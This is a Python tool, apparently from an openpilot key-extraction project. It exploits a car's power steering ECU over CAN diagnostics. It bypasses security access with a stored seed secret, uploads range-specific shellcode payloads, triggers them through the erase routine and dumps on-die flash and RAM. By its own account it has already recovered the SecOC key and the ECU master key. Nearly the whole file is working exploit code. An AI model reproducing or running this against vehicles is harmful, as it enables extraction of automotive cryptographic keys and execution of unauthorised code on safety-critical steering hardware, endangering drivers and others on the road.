#!/usr/bin/env python3
"""Exploratory range dumps: upload a range-specific payload and dump EPS memory.

Six fixed ranges beyond the production DataFlash window, for mapping parts of the EPS
nobody has read yet (code flash, the code-flash extended area, three RAM regions, and
DataFlash — every one of them on-die; nothing here reads an external part). Each
range is a separate 4096-byte payload with the range baked into four 16-bit shellcode
immediates; the driver here only has to know the matching start/end, so a profile is
just (payload, start, end, sha256).

Vehicle requirement: Not Ready to Drive mode (not READY Mode), same as the
production dump. Keeping the comma powered so the panda doesn't cold-cycle gives a
complete dump on the first run.

PROVEN FOR ONE RANGE, UNPROVEN FOR THE OTHER FIVE. The `dataflash` payload
(sha256 9545c419…) ran on the car on 2026-07-29 and its dump carried two values that
were on record beforehand: the SecOC key at 0xFF206E14 and the ECU master key at
0xFF206ED4. Matching a known answer exercises the whole chain — shellcode recovery,
immediate patching, CRC/CMAC rebuild, upload, trigger, and the frame reassembly below.
The other five payloads come off the same source shellcode and differ from the proven
one only at the four range patch sites (make_payloads.py --diff asserts exactly that),
and each is checked to decrypt to crc32 == 0xffffffff with a valid CMAC with its
immediates reading back as the requested range — but none has run. For those five a
null result still means "unknown" rather than evidence about the part, since an
unmapped or read-protected region and a payload that never reached its dump loop are
indistinguishable from here.

This mirrors the UDS session preamble in dump_dataflash.py by deliberate duplication
rather than a shared helper, matching the existing split between that module and
extractor.py: the production path stays untouched by anything done here.
"""
import hashlib
import struct
import subprocess
import time
from datetime import datetime
from pathlib import Path

from tsk.lib.env import is_agnos, RANGE_DUMP_DIR
from tsk.lib.extractor import NotAGNOSError, RetryError, TSKExtractor

# EPS UDS parameters (shared with the extractor and the production dump)
ADDR = TSKExtractor.ADDR  # 0x7a1
BUS = TSKExtractor.BUS    # 0

# Payload upload/trigger vector. Identical to dump_dataflash.dump(); only the
# payload bytes and the dump range differ between profiles.
PAYLOAD_LOAD_ADDR = 0xFEBF0000
PAYLOAD_LOAD_SIZE = 0x1000
TRIGGER_ADDR = 0x000E0000
TRIGGER_SIZE = 0x8000

# Frame collection timing. MAX_SECONDS is a hard per-run ceiling — 25 minutes for
# every profile regardless of size (Calvin: 5x the original 5-minute cap, sized for
# the 2 MB / 524,288-frame codeflash window). IDLE_TIMEOUT is what normally ends a
# run, since the EPS stops emitting once it walks off the end of its range, so the
# smaller profiles do not sit idle for 25 minutes.
IDLE_TIMEOUT = 10.0
MAX_SECONDS = 1500.0
RESPONSE_PENDING = b"\x03\x7f\x31\x78\x00\x00\x00\x00"

# The payload's RAM footprint is the whole PAYLOAD_LOAD_SIZE the upload writes, not
# the 0xFF0 CRC extent: RequestDownload places 0x1000 bytes at PAYLOAD_LOAD_ADDR (four
# 0x400 chunks), of which the trailing 16 bytes are the CMAC. So 0xFEBF0000-0xFEBF1000
# reads back as payload rather than original contents. Only `local_ram_pe1` overlaps
# this span by absolute address; see local_ram_self's alias_note for the case address
# arithmetic cannot see.
PAYLOAD_CLOBBER_START = PAYLOAD_LOAD_ADDR
PAYLOAD_CLOBBER_END = PAYLOAD_LOAD_ADDR + PAYLOAD_LOAD_SIZE


class Profile:
  def __init__(self, key, label, filename, sha256, start, end, note="", alias_note="",
               proven=False):
    self.key = key
    self.label = label
    self.filename = filename
    self.sha256 = sha256
    self.start = start
    self.end = end
    self.note = note
    # True only for a payload that has run on the car and returned a known answer.
    # Surfaced so a page cannot print one blanket "unproven" claim over all six.
    self.proven = proven
    # Surfaced on every finished dump. For a range that could alias the window the
    # payload occupies, clobber_span() returns None because it compares absolute
    # addresses only, so the warning has to be carried explicitly.
    self.alias_note = alias_note

  @property
  def total(self) -> int:
    return self.end - self.start

  @property
  def frames(self) -> int:
    return self.total // 4

  @property
  def payload_path(self) -> str:
    return str(Path(__file__).parent / self.filename)

  def clobber_span(self):
    """(offset, length) of the payload's own footprint inside this range, or None."""
    lo = max(self.start, PAYLOAD_CLOBBER_START)
    hi = min(self.end, PAYLOAD_CLOBBER_END)
    if lo >= hi:
      return None
    return lo - self.start, hi - lo


# Six ranges, generated 2026-07-29 by Sienna2024Comma notes/tools/make_payloads.py.
# That script now carries the same six in its REGIONS and pins these sha256 values in
# its SHIPPED_SHA256, so a rebuild that fails to reproduce them byte-for-byte reports
# a divergence instead of silently shipping different payloads. Its --diff mode also
# checks each payload differs from the proven `dataflash` one only at the four range
# patch sites. Range boundaries come from the RH850/P1M-E Group User's Manual:
# Hardware (R01UH0585EJ0120 Rev.1.20) Table 4.1, p.257.
# Every range sits inside one 16 MB top-byte window, which the frame reassembly below
# requires: only the low 24 bits of the address ride in the frame.
PROFILES = {
  p.key: p for p in (
    Profile(
      "codeflash", "Code flash",
      "payload_codeflash_00000000_00200000.bin",
      "860f8a3418d23ccfd0861a97efdb9e1d23a8854c3a629b8d7b6821eb93d0b588",
      0x00000000, 0x00200000,
    ),
    Profile(
      # Renamed from `ext_flash` on 2026-07-29: that name read as "external flash" and
      # had already produced one wrong label. Table 4.1 p.257 places the code-flash
      # extended user area, 8 KB reserved, and the ECC test area here, all on-die.
      # The qualifier leads deliberately — `codeflash_extended` would make a
      # dump_codeflash_* glob match this profile's files too, and collecting one
      # profile's dumps by prefix is exactly what that glob is for. make_payloads.py
      # REGIONS and SHIPPED_SHA256 key on the same name.
      "extended_codeflash", "Code flash extended area",
      "payload_extended_codeflash_01000000_0100c000.bin",
      "9882860dffe746217f776ef69d93f40bc4405c62bc009f156f87c6a444ae7b2c",
      0x01000000, 0x0100C000,
      note="Code-flash extended user area + 8 KB reserved + ECC test area.",
    ),
    Profile(
      "local_ram_pe1", "Local RAM (PE1)",
      "payload_local_ram_pe1_febe0000_fec00000.bin",
      "fbb1f5bd352c3f0bf416d6b1ef6a7696f97cad2b9f49570ca859207f3269e44f",
      0xFEBE0000, 0xFEC00000,
      "Contains the RAM key table at 0xFEBE6E34 that extractor.py reads.",
    ),
    Profile(
      "local_ram_self", "Local RAM (self)",
      "payload_local_ram_self_fede0000_fee00000.bin",
      "fba7950a62939f75d7b06e08fc1fe4ceea5fd2109b8fe4677494a3777543a35d",
      0xFEDE0000, 0xFEE00000,
      alias_note=(
        "0xFEBF0000 is at offset 0x10000 of the PE1 window and 0xFEDF0000 is at "
        "offset 0x10000 of this one. If 'self' aliases the PE1 area — which is what "
        "this profile exists to test — the payload's 4096 bytes appear here at "
        "offset 0x10000 with no absolute-address overlap to flag them. Compare this "
        "dump against a local_ram_pe1 dump at offset 0x10000 to settle it."
      ),
    ),
    Profile(
      "global_ram", "Global RAM",
      "payload_global_ram_feef8000_fef08000.bin",
      "43d00fdaf790c6deb230d3a4e7b8f8bd17e077a100fa53ebb194532f55c510fd",
      0xFEEF8000, 0xFEF08000,
    ),
    Profile(
      "dataflash", "DataFlash",
      "payload_dataflash_ff200000_ff210000.bin",
      "9545c4192797a4800d675c454892a787f1df88683522eefb6b47915cf9c7a4eb",
      0xFF200000, 0xFF210000,
      note="Ran on the car 2026-07-29: carried the known SecOC key at 0xFF206E14 "
           "and the known ECU master key at 0xFF206ED4.",
      proven=True,
    ),
  )
}

PROFILE_KEYS = tuple(PROFILES.keys())


def profile_for(key):
  return PROFILES.get(key)


def dump_dir() -> Path:
  return Path(RANGE_DUMP_DIR)


def dump_filename(profile, stamp: str) -> str:
  """Filename for a full-coverage dump. Leading token is `dump_`."""
  return f"dump_{profile.key}_{profile.start:08x}_{profile.end:08x}_{stamp}.bin"


def partial_filename(profile, stamp: str, covered: int) -> str:
  """Filename for a gapped dump. Leading token is `partial_`, never `dump_`.

  A partial is the same pre-allocated size as a complete dump with its gaps left as
  zeros, so nothing inside the file distinguishes the two. Anything that combines
  dumps — majority-voting a byte across repeated runs, for instance — would take
  those zeros as read values and let a gap outvote real data. Keeping the leading
  token different means a `dump_*.bin` glob collects only full-coverage files, and
  the coverage is in the name so a partial is self-describing when it is wanted.
  """
  return (f"partial_{profile.key}_{profile.start:08x}_{profile.end:08x}_{stamp}"
          f"_{covered}of{profile.total}.bin")


def list_dumps(profile=None, include_partial=True):
  """Persisted dumps, newest first. Filtered to one profile when given.

  Each entry carries status "complete" or "partial" so a caller never has to infer
  coverage from the bytes on disk.
  """
  try:
    entries = sorted(dump_dir().iterdir())
  except OSError:
    return []
  out = []
  for path in entries:
    if path.suffix != ".bin":
      continue
    if path.name.startswith("dump_"):
      status, prefix = "complete", "dump_"
    elif path.name.startswith("partial_"):
      if not include_partial:
        continue
      status, prefix = "partial", "partial_"
    else:
      continue
    if profile is not None and not path.name.startswith(f"{prefix}{profile.key}_"):
      continue
    try:
      size = path.stat().st_size
    except OSError:
      continue
    out.append({"name": path.name, "path": str(path), "bytes": size, "status": status})
  out.reverse()
  return out


def _noop(**kwargs) -> None:
  pass


def _finalize(profile, dump_buf, frames_count, bytes_received, stamp) -> dict:
  """Classify a finished collection and persist it. Pure apart from the file write.

  Unlike the production dump there is no key-window gate: KNOWN_KEY_OFFSET is
  meaningful only for the DataFlash-at-0xFF200000 layout, and for code flash or RAM
  a partial capture is still the data being sought. So every run that returned at
  least one frame is written, and the caller decides whether it answered anything.

  A gapped run is written under partial_filename() rather than dump_filename(), so a
  consumer combining repeated runs cannot pick it up as full coverage — see that
  function for why the distinction has to live in the name.
  """
  status = "complete" if bytes_received >= profile.total else "partial"

  if frames_count == 0:
    return {
      "status": "empty",
      "frames": 0,
      "bytes": 0,
      "total": profile.total,
      "dump_path": "",
      "message": ("No frames received.\nThe payload did not run, or the EPS did not "
                  "reach the dump loop.\nRestart the car into Not Ready To Drive mode "
                  "and try again."),
    }

  if status == "complete":
    name = dump_filename(profile, stamp)
  else:
    name = partial_filename(profile, stamp, bytes_received)
  path = dump_dir() / name
  path.parent.mkdir(parents=True, exist_ok=True)
  path.write_bytes(bytes(dump_buf))

  if status == "complete":
    message = f"Dump complete: {bytes_received}/{profile.total} bytes.\n{path.name}"
  else:
    pct = bytes_received * 100.0 / profile.total if profile.total else 0.0
    missing = profile.total - bytes_received
    message = (f"Partial dump: {bytes_received}/{profile.total} bytes ({pct:.1f}%).\n"
               f"{missing} bytes are gaps left as zero — do not combine this file with "
               f"full dumps.\n{path.name}")

  clobber = profile.clobber_span()
  if clobber is not None:
    off, length = clobber
    message += (f"\nNote: {length} bytes at offset 0x{off:x} are the payload itself, "
                "not the original contents.")

  if profile.alias_note:
    message += f"\nNote: {profile.alias_note}"

  return {
    "status": status,
    "frames": frames_count,
    "bytes": bytes_received,
    "total": profile.total,
    "dump_path": str(path),
    "message": message,
  }


def dump(profile_key, progress_cb=None) -> dict:
  """Upload the profile's payload and dump its range from the EPS.

  progress_cb, if given, is called as
    progress_cb(status=, frames=, bytes_done=, total=, message=)
  with whichever keys changed. Returns a dict:
    {status, frames, bytes, total, dump_path, message}
  where status is one of: complete | partial | empty | failed.
  Raises NotAGNOSError off-device.
  """
  profile = PROFILES.get(profile_key)
  if profile is None:
    raise RetryError(f"Unknown dump profile: {profile_key}")

  if not is_agnos():
    raise NotAGNOSError

  cb = progress_cb or _noop
  stamp = datetime.now().strftime("%Y%m%d-%H%M%S")

  from Crypto.Cipher import AES

  from opendbc.car.isotp import isotp_send
  from opendbc.car.structs import CarParams
  from opendbc.car.uds import UdsClient, ACCESS_TYPE, SESSION_TYPE, SERVICE_TYPE, \
    ROUTINE_CONTROL_TYPE, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError

  # Verify the payload before touching the car.
  payload = Path(profile.payload_path).read_bytes()
  if hashlib.sha256(payload).hexdigest() != profile.sha256:
    raise RetryError(f"{profile.label} payload SHA256 mismatch")
  if len(payload) != PAYLOAD_LOAD_SIZE:
    raise RetryError(f"{profile.label} payload wrong size")

  cb(status="running", frames=0, bytes_done=0, total=profile.total, message="")

  # Kill the manager so it doesn't restart pandad mid-dump (mirrors extractor.hack()).
  subprocess.run(["pkill", "-9", "-f", "manager.py"], check=False)
  subprocess.run(["pkill", "-9", "-f", "pandad"], check=False)
  time.sleep(2)

  panda = TSKExtractor._connect_panda()
  panda.set_safety_mode(CarParams.SafetyModel.elm327)

  uds = UdsClient(panda, ADDR, ADDR + 8, BUS, timeout=0.1, response_pending_timeout=0.1)

  # Mandatory programming-session flow, timing identical to the production dump.
  try:
    uds.diagnostic_session_control(SESSION_TYPE.DEFAULT)
    time.sleep(0.5)
    uds.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
    time.sleep(0.7)
    uds.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)
    time.sleep(1.0)
    uds.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)
  except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
    raise RetryError("Can't enter programming session.")

  # Security access.
  try:
    seed_payload = b"\x00" * 16
    seed = uds.security_access(ACCESS_TYPE.REQUEST_SEED, data_record=seed_payload)
    key = AES.new(TSKExtractor.SEED_KEY_SECRET, AES.MODE_ECB).decrypt(seed_payload)
    key = AES.new(key, AES.MODE_ECB).encrypt(seed)
    uds.security_access(ACCESS_TYPE.SEND_KEY, key)
  except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
    raise RetryError("Security Access failed")

  # Upload and verify the payload.
  try:
    uds.write_data_by_identifier(0x203, b"\x00" * 5)
    uds.write_data_by_identifier(0x201, TSKExtractor.DID_201_KEY)
    uds.write_data_by_identifier(0x202, TSKExtractor.DID_202_IV)

    request = b"\x01\x46\x01\x00" + struct.pack("!I", PAYLOAD_LOAD_ADDR) + struct.pack("!I", PAYLOAD_LOAD_SIZE)
    uds._uds_request(SERVICE_TYPE.REQUEST_DOWNLOAD, data=request)

    chunk_size = 0x400
    for i in range(len(payload) // chunk_size):
      uds.transfer_data(i + 1, payload[i * chunk_size:(i + 1) * chunk_size])
    uds.request_transfer_exit()

    verify = b"\x45\x00" + struct.pack("!I", PAYLOAD_LOAD_ADDR) + struct.pack("!I", PAYLOAD_LOAD_SIZE)
    uds.routine_control(ROUTINE_CONTROL_TYPE.START, 0x10f0, verify)
  except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
    raise RetryError("Payload upload failed")

  # Trigger the payload via the erase routine. Send manually so we don't block
  # waiting for a response that never comes. Same vector as extractor.hack().
  erase = b"\x31\x01\xff\x00" + b"\x45\x00" + struct.pack("!I", TRIGGER_ADDR) + struct.pack("!I", TRIGGER_SIZE)
  isotp_send(panda, erase, ADDR, bus=BUS)

  # Collect dump frames. Each frame carries a 24-bit pointer (low 3 bytes of the
  # address) plus 4 data bytes; the top address byte comes from the profile start.
  # Every profile range sits inside one 16 MB top-byte window, so no aliasing.
  top_byte = profile.start & 0xFF000000
  dump_buf = bytearray(profile.total)
  received = bytearray(profile.total)
  frames_count = 0
  bytes_covered = 0
  begin = time.time()
  last_progress = begin

  while True:
    if time.time() - begin > MAX_SECONDS:
      break

    made_progress = False
    for addr, *_, data, bus in panda.can_recv():
      if bus != BUS or addr != ADDR + 8 or len(data) < 8:
        continue
      if data == RESPONSE_PENDING:
        continue

      ptr_low24 = (struct.unpack("<I", data[:4])[0] >> 8) & 0xFFFFFF
      offset = (top_byte | ptr_low24) - profile.start
      if offset < 0 or offset + 4 > profile.total:
        continue

      dump_buf[offset:offset + 4] = data[4:8]
      # Count only newly-covered bytes so a retransmitted or overlapping chunk isn't
      # double-counted.
      for k in range(offset, offset + 4):
        if received[k] == 0:
          received[k] = 1
          bytes_covered += 1
      frames_count += 1
      made_progress = True

      if frames_count % 256 == 0:
        cb(status="running", frames=frames_count, bytes_done=bytes_covered, total=profile.total)

    if made_progress:
      last_progress = time.time()
    elif time.time() - last_progress > IDLE_TIMEOUT:
      break
    else:
      time.sleep(0.001)

    if bytes_covered >= profile.total:
      break

  bytes_received = bytes_covered
  cb(status="running", frames=frames_count, bytes_done=bytes_received, total=profile.total)
  return _finalize(profile, dump_buf, frames_count, bytes_received, stamp)
